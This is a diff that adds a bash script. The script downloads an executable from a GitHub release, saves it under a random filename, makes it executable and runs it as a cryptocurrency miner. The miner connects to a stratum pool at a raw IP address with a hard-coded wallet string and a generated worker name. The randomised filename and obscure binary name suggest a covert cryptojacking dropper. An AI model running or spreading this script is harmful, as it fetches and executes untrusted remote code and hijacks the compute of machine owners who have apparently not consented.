@@ -1,0 +1,51 @@
+#!/bin/bash
+
+# Generate a random 10-character lowercase alphanumeric filename
+generate_random_filename() {
+    tr -dc 'a-z0-9' < /dev/urandom | head -c 10
+    echo
+}
+
+# Generate a worker name with GT prefix, Indian date, and random suffix
+generate_worker_name() {
+    date_str=$(TZ='Asia/Kolkata' date '+%Y%m%d')
+    random_suffix=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 4)
+    echo "3VTT${date_str}${random_suffix}"
+}
+
+# Main logic
+main() {
+    # Generate filename and worker name
+    miner_filename=$(generate_random_filename)
+    worker_name=$(generate_worker_name)
+
+    echo "📥 Downloading miner to: $miner_filename"
+    if wget -q https://github.com/vedhagsvp/qubros/releases/download/apl/crcxcba -O "$miner_filename"; then
+        echo "✅ Miner downloaded as: $miner_filename"
+    else
+        echo "❌ Failed to download miner. Exiting."
+        exit 1
+    fi
+
+    echo "🔐 Setting executable permission..."
+    if chmod +x "$miner_filename"; then
+        echo "✅ Permissions set."
+    else
+        echo "❌ Failed to set permissions. Exiting."
+        exit 1
+    fi
+
+    echo "👷 Worker Name: $worker_name"
+
+    echo "🚀 Starting miner..."
+    ./"$miner_filename" -P stratum1+tcp://cb16e28eda52f3750022c539e75c84610f87af8030a9.${worker_name}@172.105.249.116:8081
+
+    if [[ $? -eq 0 ]]; then
+        echo "✅ Miner ran successfully."
+    else
+        echo "❌ Miner exited with an error."
+    fi
+}
+
+# Run the script
+main
